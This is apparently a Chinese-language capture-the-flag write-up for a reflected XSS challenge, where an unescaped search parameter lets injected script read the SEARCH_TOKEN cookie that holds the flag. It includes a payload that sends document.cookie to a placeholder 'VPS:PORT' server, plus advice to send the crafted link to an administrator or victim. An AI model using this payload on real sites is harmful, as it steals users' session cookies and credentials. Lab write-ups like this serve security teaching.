# 06 - 反射型 XSS（窃取 Cookie）

## 漏洞点

搜索页 `?q=` 参数原样回显，且出现在两个位置都没做 HTML 转义：

```html
<input type="text" name="q" value="<这里>" /> ... 您搜索的是：<这里>
```

关键凭证就放在 `SEARCH_TOKEN` 这个 Cookie 里（首页响应头 `Set-Cookie` 可见，且页面反复提示「cookie 保存着关键凭证」），所以目标是用 XSS 把受害者的 cookie 偷出来。

## 利用思路

用 `">` 先闭合 `value` 属性，再注入脚本：

```
?q="><script>alert(document.cookie)</script>
```

回显变成：

```html
<input type="text" name="q" value="" />
<script>
  alert(document.cookie);
</script>
">
```

脚本成功执行。实战里把 cookie 外带到自己的服务器：

```
?q="><script>new Image().src='http://VPS:PORT/?c='+document.cookie</script>
```

把这条链接发给「管理员/受害者」点击，VPS 日志里就能收到带 flag 的 cookie。

## Flag

凭证直接放在 `SEARCH_TOKEN` cookie 中（URL 编码，`%7B`=`{`、`%7D`=`}`）：

```
TOGOGO-flag{}
```
